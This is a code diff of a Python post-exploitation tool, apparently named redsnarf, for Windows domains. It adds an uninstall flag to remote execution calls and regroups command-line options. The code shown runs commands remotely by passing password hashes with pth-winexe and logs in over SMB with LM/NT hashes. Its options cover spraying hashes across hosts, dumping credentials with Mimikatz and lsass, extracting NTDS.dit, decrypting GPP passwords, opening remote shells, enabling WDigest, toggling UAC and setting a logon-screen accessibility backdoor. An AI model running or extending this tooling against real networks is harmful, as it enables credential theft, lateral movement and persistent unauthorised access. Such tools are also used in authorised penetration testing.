@@ -99,15 +99,10 @@ def WriteLAT():
 
 def get_ip_address(ifname):
 	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	return socket.inet_ntoa(fcntl.ioctl(
-		s.fileno(),
-		0x8915,  # SIOCGIFADDR
-		struct.pack('256s', ifname[:15])
-	)[20:24])
-
+	return socket.inet_ntoa(fcntl.ioctl(s.fileno(),0x8915,struct.pack('256s',ifname[:15]))[20:24])
 
 def datadump(user, passw, host, path, os_version):
-	return_value=os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C \" 2>/dev/null")
+	return_value=os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C \" 2>/dev/null")
 	signal_number = (return_value & 0x0F)
 	if not signal_number:
 		exit_status = (return_value >> 8)
@@ -259,14 +254,12 @@ def datadump(user, passw, host, path, os_version):
 				except OSError:
 					print colored("[-]Something went wrong running Mimikatz...",'red')
 
-						
 			if xcommand!='n':
 				try:
 					print colored("[+]Running Command: "+xcommand,'green')
 					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c "+xcommand+"\" 2>/dev/null")
 				except:
 					print colored("[-]Something went wrong ...",'red')
-
 			
 			if stealth_mimi in yesanswers:
 				try:
@@ -358,26 +351,18 @@ def checkport():
 
 def run():
 	for target in targets:
-
 		host=str(target)
-		
 		passwd=''
-
 		if passw[len(passw)-3:] ==':::':
 			lmhash, nthash ,s1,s2,s3 = passw.split(':')
 		else:
 			lmhash = ''
 			nthash = ''
-
 		if nthash=='':
 			passwd=passw	
-
 		try: 
-
 			smbClient = SMBConnection(host, host, sess_port=int('445'),timeout=10) 
-
 			x=smbClient.login(user, passwd, domain_name, lmhash, nthash)
-						
 			if x==None or x==True:
 				if smbClient.getServerOS().find('Windows')!=-1 and smbClient.isGuestSession() ==0:
 					print colored("[+]"+host+" responding to 445",'green')
@@ -388,7 +373,6 @@ def run():
 					resp = smbClient.listShares()
 					for i in range(len(resp)):                        
 						print resp[i]['shi1_netname'][:-1]
-
 					t = Thread(target=datadump, args=(user,passw,host,outputpath,smbClient.getServerOS()))
 					t.start()
 					t.join()
@@ -473,33 +457,41 @@ def main():
 					print colored ("[+]Found " + find_user + " logged in to "+str(ip),'green')
 
 banner()
-p = argparse.ArgumentParser("%(prog)s -H ip=192.168.0.1 -u administrator -p Password01", version="%prog 0.2d", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150))
+p = argparse.ArgumentParser("./redsnarf.py -H ip=192.168.0.1 -u administrator -p Password01", version="%prog 0.2d", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150))
+# Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
-p.add_argument("-u", "--username", dest="username", default="administrator",help="Enter a username")
+p.add_argument("-u", "--username", dest="username", default="Administrator",help="Enter a username")
 p.add_argument("-p", "--password", dest="password", default="Password01", help="Enter a password or hash")
-p.add_argument("-C", "--credsfile", dest="credsfile", default="", help="Spray multiple hashes at a target range")
-p.add_argument("-c", "--credpath", dest="credpath", default="/opt/creddump7/", help="<Optional> Enter path to creddump7 default /opt/creddump7/")
-p.add_argument("-o", "--outputpath", dest="outputpath", default="/tmp/", help="<Optional> Enter output path default /tmp/")
-p.add_argument("-m", "--mergepf", dest="mergepf", default="/tmp/merged.txt", help="<Optional> Enter output path and filename to merge multiple pwdump files default /tmp/merged.txt")
-p.add_argument("-S", "--skiplsacache", dest="skiplsacache", default="n", help="<Optional> Enter y to skip dumping lsa and cache and go straight to hashes!!")
-p.add_argument("-d", "--dropshell", dest="dropshell", default="n", help="<Optional> Enter y to Open up a shell on the remote machine")
-p.add_argument("-l", "--lsass_dump", dest="lsass_dump", default="n", help="<Optional> Dump lsass for offline use with mimikatz")
-p.add_argument("-P", "--policiesscripts_dump", dest="policiesscripts_dump", default="n", help="<Optional> Enter y to Dump Policies and Scripts folder from a Domain Controller")
-p.add_argument("-D", "--domain_name", dest="domain_name", default=".", help="<Optional> Enter domain name")
-p.add_argument("-g", "--c_password", dest="c_password", default="", help="<Optional> Decrypt GPP Cpassword")
-p.add_argument("-n", "--ntds_util", dest="ntds_util", default="", help="<Optional> Extract NTDS.dit using NTDSUtil")
-p.add_argument("-i", "--drsuapi", dest="drsuapi", default="", help="<Optional> Extract NTDS.dit hashes using drsuapi method - accepts machine name as username")
-p.add_argument("-M", "--massmimi_dump", dest="massmimi_dump", default="n", help="<Optional> Mimikatz Dump Credentaisl from the remote machine(s)")
-p.add_argument("-a", "--service_accounts", dest="service_accounts", default="n", help="<Optional> Enum service accounts, if any")
-p.add_argument("-F", "--find_user", dest="find_user", default="n", help="<Optional> Find user - Live")
-p.add_argument("-f", "--ofind_user", dest="ofind_user", default="n", help="<Optional> Find user - Offline")
-p.add_argument("-L", "--lat", dest="lat", default="n", help="<Optional> Write batch file for turning on/off Local Account Token Filter Policy")
-p.add_argument("-x", "--xcommand", dest="xcommand", default="n", help="<Optional> Run custom command")
-p.add_argument("-R", "--edq_rdp", dest="edq_rdp", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery RDP Status")
-p.add_argument("-r", "--edq_nla", dest="edq_nla", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery NLA Status")
-p.add_argument("-t", "--edq_trdp", dest="edq_trdp", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Tunnel RDP out of port 443")
-p.add_argument("-W", "--edq_wdigest", dest="edq_wdigest", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Wdigest UseLogonCredential Registry Setting")
-p.add_argument("-s", "--stealth_mimi", dest="stealth_mimi", default="n", help="<Optional> stealth version of mass-mimikatz")
+p.add_argument("-d", "--domain_name", dest="domain_name", default=".", help="<Optional> Enter domain name")
+# Configurational 
+p.add_argument("-cC", "--credpath", dest="credpath", default="/opt/creddump7/", help="<Optional> Enter path to creddump7 default /opt/creddump7/")
+p.add_argument("-cO", "--outputpath", dest="outputpath", default="/tmp/", help="<Optional> Enter output path default /tmp/")
+p.add_argument("-cM", "--mergepf", dest="mergepf", default="/tmp/merged.txt", help="<Optional> Enter output path and filename to merge multiple pwdump files default /tmp/merged.txt")
+p.add_argument("-cS", "--skiplsacache", dest="skiplsacache", default="n", help="<Optional> Enter y to skip dumping lsa and cache and go straight to hashes!!")
+# Utilities
+p.add_argument("-uP", "--policiesscripts_dump", dest="policiesscripts_dump", default="n", help="<Optional> Enter y to Dump Policies and Scripts folder from a Domain Controller")
+p.add_argument("-uG", "--c_password", dest="c_password", default="", help="<Optional> Decrypt GPP Cpassword")
+p.add_argument("-uD", "--dropshell", dest="dropshell", default="n", help="<Optional> Enter y to Open up a shell on the remote machine")
+p.add_argument("-uX", "--xcommand", dest="xcommand", default="n", help="<Optional> Run custom command")
+# Hash related
+p.add_argument("-hN", "--ntds_util", dest="ntds_util", default="", help="<Optional> Extract NTDS.dit using NTDSUtil")
+p.add_argument("-hI", "--drsuapi", dest="drsuapi", default="", help="<Optional> Extract NTDS.dit hashes using drsuapi method - accepts machine name as username")
+p.add_argument("-hS", "--credsfile", dest="credsfile", default="", help="Spray multiple hashes at a target range")
+p.add_argument("-hL", "--lsass_dump", dest="lsass_dump", default="n", help="<Optional> Dump lsass for offline use with mimikatz")
+p.add_argument("-hM", "--massmimi_dump", dest="massmimi_dump", default="n", help="<Optional> Mimikatz Dump Credentaisl from the remote machine(s)")
+p.add_argument("-hR", "--stealth_mimi", dest="stealth_mimi", default="n", help="<Optional> safe version of mass-mimikatz")
+# Enumeration related
+p.add_argument("-eA", "--service_accounts", dest="service_accounts", default="n", help="<Optional> Enum service accounts, if any")
+p.add_argument("-eL", "--find_user", dest="find_user", default="n", help="<Optional> Find user - Live")
+p.add_argument("-eO", "--ofind_user", dest="ofind_user", default="n", help="<Optional> Find user - Offline")
+# Registry related
+p.add_argument("-rL", "--lat", dest="lat", default="n", help="<Optional> Write batch file for turning on/off Local Account Token Filter Policy")
+p.add_argument("-rR", "--edq_rdp", dest="edq_rdp", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery RDP Status")
+p.add_argument("-rN", "--edq_nla", dest="edq_nla", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery NLA Status")
+p.add_argument("-rT", "--edq_trdp", dest="edq_trdp", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Tunnel RDP out of port 443")
+p.add_argument("-rW", "--edq_wdigest", dest="edq_wdigest", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Wdigest UseLogonCredential Registry Setting")
+p.add_argument("-rB", "--edq_backdoor", dest="edq_backdoor", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Backdoor Registry Setting - Left Alt + Left Shift + Print Screen at Logon Screen")
+p.add_argument("-rU", "--edq_uac", dest="edq_uac", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery UAC Registry Setting")
 
 args = p.parse_args()
 
